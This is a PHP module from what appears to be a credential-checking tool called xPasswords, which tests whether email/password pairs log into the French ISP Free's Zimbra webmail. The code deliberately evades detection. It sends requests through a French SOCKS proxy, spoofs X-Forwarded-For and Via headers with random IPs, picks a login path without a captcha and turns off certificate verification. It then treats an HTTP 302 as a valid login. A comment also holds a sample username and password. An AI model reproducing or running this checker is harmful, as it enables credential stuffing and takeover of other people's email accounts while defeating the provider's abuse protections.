<?php
namespace xPasswords\Providers;

class Free {
    
    static public $imapAddress = 'imap://imap.free.fr:143';
    
    static public function authenticate($email, $password) {
        
        // Shared options
        $staticOptions = [
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];
        
        // Use Zimbra access with no captcha
        $request = \Requests::post('http://zimbra.free.fr/zimbra.pl', [
            // Try to spoof and make the IP detection more complex
            'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            'Referer' => 'http://zimbra.free.fr/zimbra.pl',
            'Origin' => 'http://zimbra.free.fr',
            'Cookie' => 'cto_free=',
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
        ], [
            // actionID=105&url=&mailbox=INBOX&login=claude011&password=19201920&Envoyer=S%27identifier
            'actionID' => '105',
            'mailbox' => 'INBOX',
            'login' => explode('@', strtolower($email))[0],
            'password' => $password,
            'Envoyer' => 'S\'identifier',
            'url' => '',
        ], [
            'timeout' => 60, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);

        switch($request->status_code) {
            case 302: // Authorized
            return true;
            break;

            case 200: // Unauthorized
            return false;
            break;

            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Free returned anormal HTTP code: ' . $request->status_code . ' for ' . $email, ['color' => 'red']);
            break;
        }
        
        return false;
    }
};